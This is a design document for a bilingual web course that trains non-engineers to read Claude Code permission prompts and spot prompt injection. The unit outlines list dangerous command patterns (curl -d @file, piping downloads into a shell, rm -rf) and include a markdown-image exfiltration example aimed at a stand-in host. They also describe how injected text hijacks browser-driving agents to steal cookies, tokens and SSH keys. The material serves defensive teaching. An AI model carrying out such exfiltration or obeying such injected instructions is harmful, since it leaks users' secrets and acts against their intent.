# Claude Code 101: design

A web course that teaches non-engineers how Claude Code works behind the scenes, so they can use it with MCP servers, browsers, and local tools without leaking their secrets, wiping their data, or getting hijacked by prompt injection. It's built as a game: short Learn cards, then many hands-on simulations.

Status: approved by the owner on 2026-10-21. Next step: implementation plan.

## Why this exists

The learners are people with **no programming or UNIX background** who have never used Claude Code and want to get better at it. Their goal is to build interactive web pages by connecting Claude Code to a lot of tools: MCP servers like Notion and Figma, and local tools like Node.js and Playwright.

That gives them a lot of power with no way to read what the agent is about to do. The course's main job is **not** to teach them to build pages. It's to make them understand what Claude Code is doing behind the scenes, so they can:

- read a permission prompt and tell a routine command from a dangerous one,
- recognize prompt injection, wherever it hides,
- understand the "deadly combo" (private data + untrusted content + a way out) and break it, especially when the agent drives a browser,
- choose safe setups (browser profiles, permission choices, and later sandboxes) instead of turning safety off.

Prior art the owner pointed to:

- **cascade-learn** (https://github.com/TETRA2000/cascade-learn), the owner's earlier Duolingo-style course app: units, Learn cards with playgrounds you can safely break, practice quizzes with hearts and XP, missed questions coming back at the end, and JSON content. This course reuses its structure and look.
- **"Continue? Y/N"** (https://llmgame.scalex.dev/), a 60-second game in a fake Claude Code terminal. Commands stream in with plausible explanations, you press Y or N, and approving a dangerous one shows a fake BREAKING headline. The recap lists what you allowed and denied, each with a one-line lesson. It works because the harmless commands train you to keep pressing Y. The owner wants **lots of interactive tutorials in this style**.

## Goals

1. A new, standalone web app in this repo (`claude-code-101`). It is not a course inside cascade-learn.
2. Every lesson in **English and Japanese**, with a language switch.
3. Mostly practice, not reading: each unit has a few Learn cards, then many scripted simulations where the learner makes the call and sees what happens.
4. The first version ships **5 complete units** (below), and the course map shows **every planned unit**. Unfinished ones appear as "Coming soon" cards with a title, a one-line description, and what you'll practice, so learners can see the whole path. (Owner's requirement.)
5. Every claim about Claude Code is accurate as of the date it was written.

## Non-goals (first version)

- Teaching people to build web pages.
- Accounts, sync, a backend, leaderboards, or analytics. Progress stays in the browser.
- Any real AI, real command execution, or real network calls. Every simulation is scripted and fake.
- The six "Coming soon" units' content.
- Making the site easy to find (SEO, social sharing). The owner doesn't care about this for now.

## Anti-goals: failures even if it technically works

These weren't stated by the owner and are my calls. Please check them.

- **Scaring people off Claude Code.** The message is "read before you approve, and set things up safely," not "never let the agent do anything." Practice must include plenty of harmless commands where **No is the wrong answer**. Treating every request as dangerous is just permission fatigue in reverse.
- **Being wrong about Claude Code.** A security course with wrong facts is worse than none.
- **Becoming an attack cookbook.** Examples show the *shape* of an attack. Nothing should work as a real attack if copied (see Content safety).
- **Reading like documentation.** No walls of text. If an idea can be clicked, it should be.
- **Unexplained jargon.** Every term (path, flag, token, MCP, context window) is explained in plain words the first time it appears, in both languages.

## Who it's for, concretely

A non-engineer on a laptop, likely with Claude Code open in another window later. Design for laptop first, but every screen must also work at phone width (cascade-learn was phone-first; this one flips that).

**Which Claude Code they use (owner's decision):** the **Claude Code desktop app** and the **terminal (CLI)**. Simulations are drawn in both:
- Each simulation item says which app it shows.
- Practice mixes the two.
- The prompt-anatomy Learn card shows the same request in both apps side by side.

The VS Code extension and Claude Code on the web aren't simulated in v1. Claude Code on the web appears later as a sandbox option in unit 9.

What follows from this, all **to be verified against current docs when written**:
- The desktop app's permission screen, its permission modes (including auto mode), and its built-in browser each need accurate simulations.
- Unit 5 has to cover both browser stories. In the terminal, a browser-control MCP server or extension can be pointed at your everyday, logged-in Chrome. In the desktop app, a built-in browser is separate from your everyday one, but whatever you sign into there is in reach.
- My call: unit 3 recommends the default "ask before acting" mode while learning. Auto mode is explained (what decides, and what it can still let through) but not recommended to beginners. Turning permissions off entirely is always marked wrong in "Pick the setup".

## The course map

The order is set so the five first-version units come first and the map has no gap. (My call: in earlier mockups "Who can do what" was unit 2. It moves to unit 6, and unit 1 covers just enough about environment variables and secrets.)

| # | Unit | v1? | Covers |
|---|---|---|---|
| 1 | Your computer, from the inside | **Yes** | Terminal, files and folders, paths, `~`, hidden dot-files, where secrets live, what `rm` really does |
| 2 | How Claude Code works | **Yes** | The agent loop, tools, the context window, CLAUDE.md and memory, MCP as "more tools" |
| 3 | Permission prompts | **Yes** | Reading a prompt; Yes / Yes-don't-ask-again / No; permission modes; red-flag patterns; permission fatigue |
| 4 | Prompt injection | **Yes** | Where injections hide, invisible text, warning signs, persistence via CLAUDE.md, what to do |
| 5 | Browser automation | **Yes** | Your logged-in browser, the deadly combo, how data leaves through a browser, risky browser tools, safe setups |
| 6 | Who can do what | Coming soon | Users, file permissions (`rwx`), `sudo`, environment variables. Claude runs with *your* powers |
| 7 | MCP servers | Coming soon | Local vs. remote servers, what a connector can see and do, login scopes, poisoned tool descriptions, servers that change after approval, cross-server injection |
| 8 | Installing code safely | Coming soon | Lookalike and made-up packages, install scripts, `curl \| sh`, `npx -y`, booby-trapped projects (`.claude/settings.json`, hooks, `.mcp.json`) |
| 9 | Sandboxes | Coming soon | What a sandbox is; Claude Code's built-in sandbox; Docker Sandbox; Claude Code on the web; VS Code dev containers; **network restrictions** (allowlists, blocked-request reports, open domains that act as exits like paste and gist sites, "allow all", localhost / Docker socket / cloud metadata back doors) |
| 10 | Locking it down | Coming soon | Allow/deny rules, settings files and their scopes, hooks, advanced permission modes, separate browser profiles: build your own safe setup |
| 11 | Boss: Continue? Y/N | Coming soon | 60 seconds, ~20 prompts, mostly harmless. Can you keep reading? Recap with headlines |

The owner's topic list maps onto this: "basic UNIX commands and its security model" is units 1 and 6; "basic Claude Code security model" is units 2–3; "advanced" is units 9–10; "MCP servers and their risks" is unit 7 (MCP shows up in v1 inside units 2, 4 and 5 too).

Each "Coming soon" card needs its title, a one-line description, and its practice-type chips, in both languages. Their full outlines are above so the cards and later work agree.

## How a unit works

Same loop as cascade-learn:

- **Learn first:** 3–5 Learn cards, each one idea, most with a small interactive demo (a playground you can safely break).
- **Then practice:** 8–12 simulations mixing that unit's practice types, roughly easy to hard.
- **5 hearts per practice run.** A wrong answer costs a heart and comes back at the end. **XP** for first-try answers, less on retry. Running out of hearts ends the run with "try again".
- **Every answer teaches.** Feedback always explains why, right or wrong. Each wrong *option* has its own consequence text, not one generic "wrong".
- **Dangerous approvals end with a fake BREAKING headline** (llmgame's device), followed by plain-language explanation and what to say to Claude instead.
- Progress (completed cards, practice runs, XP, language) is saved in `localStorage`.
- **No locking** (my call). Any finished unit can be opened at any time, so someone who came for browser safety can go straight to unit 5. The map shows a suggested order and marks the next suggested unit. Practice isn't gated behind Learn cards either. The padlocks in the mockup are only for "Coming soon" units.

## Practice types

Simulations are drawn as realistic-but-generic environments: a Claude Code-style terminal, a browser window, a notes page, a design-tool layer list. Third-party products (Notion, Figma, Gmail, banks) are shown as **generic look-alikes**, never branded copies (my call). The Claude Code terminal is shown as Claude Code, since that's the subject.

**Needed for v1:**

| Type | What the learner does | Correct when | Used in units |
|---|---|---|---|
| **Approve or deny** | Sees the task they gave Claude, Claude's narration, and a permission prompt (tool, command or target, Claude's stated reason) drawn as the desktop app or the terminal. Picks Yes / Yes-don't-ask-again / No. Optional "Decode the command" hint costs XP. | Their choice is in the item's set of **accepted answers** (one or more). See the grading rules below. | 3, 4, 5 |
| **Decode the command** | Matches each piece of a command (`curl`, `-d @.env`, `\|`, `~`, `sudo`, `rm -rf`) to what it does. | All pieces matched. Costs no hearts, like cascade's Match pairs. | 1, 3 |
| **Predict** | Reads a command and a described situation (files present, folder you're in), then picks what happens or what's printed. | Picked option = answer | 1, 2 |
| **Match pairs** | Vocabulary: term ↔ meaning, tool ↔ what it can do, path ↔ what's inside. | All matched. No hearts. | 1, 2 |
| **Order the loop** | Puts the steps of an agent run in order. | Order matches | 2 |
| **Find the hidden order** | Reads a document (notes page, web page, layer list, README, issue comment, email, image alt text). Toggles "As you see it" / "As Claude sees it" (hidden text, HTML comments and alt text show up in the second). Taps the line(s) aimed at the AI. | Selected line(s) = answer | 4, 5 |
| **Stop the chain** | Sees the task and an environment panel (browser or terminal), plus Claude's numbered tool calls with stated reasons. Taps the **first** step that should have been denied. | First wrong step picked. Feedback differs for "too early" (that step was fine) and "too late" (data already in Claude's context) | 4, 5 |
| **Break the combo** | Sees an attack scenario with its three ingredients. Picks the change that stops it from a list where some changes don't remove any ingredient. | Chosen change removes an ingredient | 5 |
| **Pick the setup** | Given a task, chooses a setup: which browser profile, which permission answer, which mode. | Picked = answer | 3, 5 |

**Grading Approve or deny** (my calls):
- **Dangerous request:** only No is accepted. Yes, or Yes-don't-ask-again, costs a heart and shows the BREAKING headline. Don't-ask-again adds a line saying future requests like it won't be asked about.
- **Harmless request whose saved rule would be narrow and safe** (e.g. `npm run build`): Yes and Yes-don't-ask-again are both accepted.
- **Harmless request whose saved rule would be broad** (e.g. it would allow every `curl`): only Yes is accepted. Don't-ask-again costs a heart and explains what the rule would let through later. No BREAKING headline, since nothing bad happened yet.
- **No on a harmless request:** costs a heart, with gentle feedback explaining why it was safe and that blocking routine work is its own trap.
- Every option on every item has its own feedback text.

**Learn-card demos needed for v1:** a terminal playground (click scripted commands, see annotated output, with hidden files and fake secrets showing up), a "color the context" view (the context window as a stack of text, colored by who wrote each piece), and a labeled anatomy of a permission prompt. Others are up to the builder.

**Later types (for Coming soon units, not v1):** Read the scopes (MCP install/login screens), Spot the poisoned tool, Real or fake package, Build the rule (assemble allow/deny rules), Fix the settings (find the dangerous line in a project's `.claude/settings.json` / `.mcp.json`), Inside or outside? (what a sandbox can reach), Will it get out? / Trim the list (network allowlists), and the timed boss version of Approve or deny with a recap screen.

## v1 unit outlines

Topic lists for authors. Card counts and wording are up to the builder within 3–5 cards and 8–12 practice items per unit.

**1. Your computer, from the inside.** What a terminal is and why Claude Code uses one. Files, folders, paths; `~` is your home folder. Hidden dot-files (`ls` vs `ls -a`). Where secrets live: `.env`, `~/.ssh`, `~/.aws`, shell profiles like `~/.zshrc`, tool login files, browser profiles. The terminal has no trash can: `rm`, `rm -rf`, and `>` overwriting a file. Practice: Predict (`ls` vs `ls -a`), Decode (`cd`, `ls`, `cat`, `rm -rf`, `>`, `|`, `curl`), Match pairs (path ↔ what's inside).

**2. How Claude Code works.** The agent loop: you ask, Claude picks a tool, the result goes back into its context, repeat. The tools: read, edit, run commands, web fetch/search, MCP tools. Claude's commands run **as you**, with everything you can access. The context window: everything is one stack of text, and tool results written by strangers land next to your words. CLAUDE.md and memory are read every session. MCP servers add more tools, each one more power and more text from outside. Claude can be confidently wrong ("I removed the secret"): check the result, not the summary. Practice: Color the context, Order the loop, Match pairs (tool ↔ power), Predict ("what can Claude see right now?").

**3. Permission prompts.** Anatomy of a prompt. The three answers, and that "don't ask again" saves a rule that keeps applying. Which actions ask and which don't, and the permission modes, **verified against current docs at authoring time**. Read the target (path, URL, flags), not the reason: Claude's explanation can sound fine while the command isn't. Red flags: paths outside the project (`~`, `/`), sending files (`curl -d @file`, uploads), piping downloads into a shell, `rm -rf`, `sudo`, `chmod 777`, global installs, editing shell profiles, force-pushing. Permission fatigue. Practice: mostly Approve or deny (**roughly 60% harmless**), plus Decode and Pick the setup.

**4. Prompt injection.** What it is. Where it hides: web pages, notes and docs pages, design-tool layer names, READMEs, issue comments, emails, package docs, image alt text, tool output. Invisible tricks: white text, HTML comments, alt text, tiny text. Warning signs: it addresses the AI, claims authority or pre-approval ("this is pre-approved"), says "don't tell the user", or asks to move data or run something unrelated to the task. Persistence: injected text that gets written into CLAUDE.md affects every later session. What to do: stop, ask Claude what it read and why, and don't approve steps outside the task. Practice: Find the hidden order (several sources), Stop the chain (terminal), Approve or deny where the request came from an injection.

**5. Browser automation.** How agents drive browsers (browser-control MCP servers and extensions, described generically). Your everyday browser profile is your whole online life: logged-in sessions, cookies, saved passwords. The deadly combo, scenarios the owner asked for:
- **Primary-browser takeover:** an injected page sends the agent to your mail and out through a URL.
- **Cookie and token dump** through in-page scripts.
- **Form upload trap:** the agent uploads `~/.ssh/id_rsa` or `.env`.
- **Network log leak:** login tokens in captured request headers.
- **Clicking yes as you:** OAuth consent, purchases, deletes.
- **Screenshot spill.**
- **Hidden text** on pages.
- **Markdown-image exfiltration** (`![](https://evil.example/?q=SECRET)`).

Safe setups: a separate profile with no logins, a fresh automation browser, limiting which sites it can open, approving each navigation, logging in only to test accounts. Practice: Stop the chain (browser), Break the combo, Pick the setup, Find the hidden order (web pages), Approve or deny for browser tool calls (navigating to a URL carrying data, running scripts that read cookies, uploading files).

## Content rules

**Bilingual.** All learner-facing text exists in English and Japanese. The switch is in the header and remembered. The default comes from the browser's language (my call). **English is the primary language** (owner's decision): content is written in English first, and Japanese is a full translation that should read naturally. No separate Japanese review step is planned. Commands, file paths, code, and terminal output stay as they really appear and are never translated. Claude's narration inside a simulation is translated, since Claude answers in the user's language (my call).

**Accuracy.** Every fact about Claude Code's behavior (prompts, modes, settings, tools, sandboxing) is checked against the official Claude Code documentation when written. Content stores the source and a "last checked" date, and the site shows "last checked" per unit (my call). The permission-prompt wording in simulations should match the real prompt closely.

**Content safety** (my calls):
- Fake secrets are obviously fake (e.g. `ntn_FAKE_8f3c…`).
- Attacker endpoints use reserved domains (`.example`, `example.com`, `.test`, `.invalid`). Well-known real services (a public paste site, npm, GitHub) may appear as the *destination* in a command, because recognizing them is the skill, but nothing is ever contacted.
- Injection text is illustrative and short, never a tuned jailbreak.
- No copy buttons on dangerous commands.
- The site makes no network requests beyond loading itself (and fonts).

**Content lives in JSON**, typed and validated, as in cascade-learn. Components never hold lesson text.

## Look and feel

Reuse cascade-learn's design tokens (`docs/design-tokens.md` there):
- Colors: warm ivory background, ink text, indigo primary, accent and feedback colors.
- Fonts: Bricolage Grotesque for display, DM Sans for body, JetBrains Mono for code. Add **Noto Sans JP** for Japanese.
- Components: chunky 3D buttons, ≥44px targets, a dark code/terminal panel.

Accessibility rules carry over: real buttons, `aria-pressed`, `aria-live` feedback, progressbars with values, 4.5:1 contrast, right/wrong never shown by color alone, and `prefers-reduced-motion` respected.

**Mockups:** `reference/design-canvas/` in this repo, also viewable at https://claude.ai/artifact/7zk5EQ53c6xfW3S8R4TpxE (private to the owner). They cover the course map (with working language switch), Learn: what Claude sees, Learn: terminal playground, Approve or deny, Find the hidden order, and Stop the chain. Use them as a spec for layout and behavior. They're written for a design-canvas runtime and won't run on their own, so don't port that runtime. The owner reviewed them and said they look good.

Where the mockups and this document disagree, this document wins:
- the unit order;
- the static "0:42" timer on Approve or deny, which belongs to the later boss unit;
- the per-item "Try again" button (missed items come back at the end of the run instead);
- the padlocks on finished units;
- the terminal-only look (simulations also come in a desktop-app version).

## Stack and build (decided)

- Same stack as cascade-learn: Vite + React + TypeScript, CSS Modules, Vitest, Playwright, GitHub Actions CI.
- A static site with no server.
- The builder may copy and adapt cascade-learn's quiz engine (session, hearts, re-queue, feedback sheet, progress storage) into this repo rather than sharing a package (my call).

## Left to the builder

- Exact JSON schema and file layout for content and translations.
- Component structure, and how much cascade-learn code to copy versus rewrite.
- XP amounts and the decode-hint cost.
- Learn-card illustrations beyond the three named demos.
- How "last checked" is shown.
- Hosting and deploy (not needed for v1).
- A content-validation script (cascade-learn checks answers with scripts; here the useful checks are things like "every item has both languages", "every option has feedback", "answers point at real options").

## Open questions

None from the owner. Calls marked "my call" above are open to override.
